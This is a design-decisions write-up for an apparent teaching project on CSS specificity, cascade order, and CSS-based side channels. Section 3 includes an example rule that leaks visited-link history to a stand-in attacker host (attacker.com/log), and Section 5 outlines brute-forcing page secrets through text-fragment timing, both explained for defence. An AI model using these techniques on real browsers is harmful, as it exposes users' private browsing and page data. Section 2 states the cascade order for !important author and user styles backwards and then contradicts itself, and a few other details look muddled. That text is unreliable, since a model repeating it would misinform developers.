# B06 — CSS Cascade & Timing Side-Channels: Design Decisions

## 1. Specificity as Ordered Triple (Not Single Integer) — Why

**Decision:** `specificity_t` is a struct `{ids, classes, elements}`. The comparison function `spec_cmp()` compares fields left to right. We do NOT collapse to a single number like `ids*10000 + classes*100 + elements`.

**Why:** The single-integer encoding breaks if any component exceeds the base. A selector with 101 class components (`a.b.c...` × 101) would overflow the classes slot and produce an `ids` carry, making it appear to have an id selector. The CSS specification explicitly states that specificity is an ordered tuple and that "concatenating" the three numbers into one is not correct in general. The spec uses the notation `(a, b, c)` and says "comparisons are made component by component from left to right." Our struct encodes this exactly.

**Trade-off:** The struct comparison requires three integer comparisons instead of one. For the number of rules a real browser handles (thousands per page), this is negligible. The correctness gain is absolute: no overflow edge case can corrupt the comparison.

---

## 2. Cascade Order: Origin > Importance > Specificity > Source Order

**Decision:** The `cascade()` function applies the W3C cascade order: `!important` author beats `!important` user, which beats normal author, which beats normal user, which beats user-agent. Within the same origin and importance level, specificity decides; ties go to last source order.

**Why:** This ordering exists to serve three stakeholders: the page author (who knows what the design should look like), the user (who may need to override for accessibility — larger fonts, high contrast), and the browser (which supplies baseline styles). `!important` inverts the author/user priority specifically to let users override author styles even when the author used `!important` — this is critical for accessibility users who force high contrast. The cascade algorithm balances all three parties.

**Trade-off:** The `!important` inversion is non-obvious and a common source of bugs. Developers who write `color: red !important` may not realise that a user's forced-color stylesheet can still override them. The spec behaviour is correct for accessibility but surprises authors who assume `!important` means "nothing can override this."

---

## 3. CSS as a Side-Channel: Why Network Requests Triggered by CSS Leak Information

**Decision:** `timing_demo.c` simulates the `@font-face` history-sniffing attack: a CSS rule fires a "network request" only if it matches, and the presence or absence of that request reveals DOM state to a remote attacker.

**Why:** CSS was designed to be declarative and "safe" — just styling, no computation. But any CSS feature that conditionally triggers a network request (font loading, background images, `@import`) creates a covert channel: the rule fires (or does not) depending on the page's DOM state, and the server sees (or does not see) the request. For `@font-face { src: url(attacker.com/log) }` combined with `:visited`, the attacker's server logs which URLs the browser visited without any JavaScript running. The browser cannot easily distinguish "attacker wants to style links" from "attacker is probing browsing history."

**Trade-off:** Blocking all conditional CSS network requests would break custom fonts, background images, and many other legitimate uses. Instead browsers adopted a targeted fix: `:visited` CSS is restricted to a small set of "safe" properties (color, background-color, border-color, outline-color) that do not trigger layout or network fetches. The restriction is enforced in the rendering engine, not at the CSS language level.

---

## 4. Why @font-face and ::visited Are Restricted

**Decision:** The timing demo notes that browsers now block `@font-face` inside `:visited` rules and limit `:visited` to colour-only properties.

**Why:** The `::visited` history-sniffing attack was documented in 2002 and exploited in the wild by 2010. The fix shipped in all major browsers in 2010 (Firefox 3.6, Chrome 6). The restriction works as follows: even if a developer writes `:visited { font-family: leak; }`, the browser's style resolution returns the unvisited style for layout-affecting properties. Only colour-changing properties are allowed through, because colour changes are already visible to the user (they expect visited links to look different) and do not trigger network requests.

**Trade-off:** This breaks legitimate uses of `:visited` for complex styling. Developers who want visited links to have a different font or icon must use a JavaScript approach (which is also blocked by partitioned storage, making it harder to exploit). The restriction is a deliberate de-featuring of CSS in the name of privacy.

---

## 5. Scroll-to-Text-Fragment and Timing — Content Inference

**Decision:** Attack 2 demonstrates that `#:~:text=...` fragment navigation takes measurably longer when the target text exists, allowing an attacker to infer page content.

**Why:** The browser must scan the entire text content of the page to find the target string. If it finds it, it scrolls — triggering layout, paint, and compositing. If not, it exits quickly. An attacker who loads the victim page in a cross-origin iframe and measures the `onload` timing can distinguish these two cases. The attack was discovered in 2021 and disclosed to Chrome and Safari. It is particularly concerning because the URL-embedded text query can encode specific secrets ("social security number: 123-45-6789") — an attacker can brute-force one character at a time.

**Trade-off:** The feature (`#:~:text=`) was introduced for accessibility and productivity (deep-linking to specific passage). Removing it would break legitimate use. Mitigations adopted: delay the scroll until after `onload` fires, add random timing noise, require a user gesture before fragment activation, and gate `SharedArrayBuffer` (the high-resolution timer) behind `crossOriginIsolated`.

---

## 6. Why CSS Isolation Matters Even Within Same-Origin Iframes

**Decision:** The DECISIONS.md notes that CSS timing attacks apply even within same-origin iframes, not only cross-origin.

**Why:** Same-origin iframes share DOM access by default, so an inner iframe can read the outer frame's DOM directly — CSS timing attacks are not the primary vector there. However, within the same-origin context, CSS timing matters for a different reason: CSS selectors can match elements in the Light DOM that contain sensitive data rendered by trusted components (e.g., a bank's own page rendering account numbers). A malicious script injection into the same origin can use CSS timing to infer which CSS rules matched which elements without reading the DOM directly — useful when Content Security Policy blocks `eval` but not style injection. Partitioned CSS caches and CSS containment (`contain: strict`) limit cross-component information leakage even within the same origin.
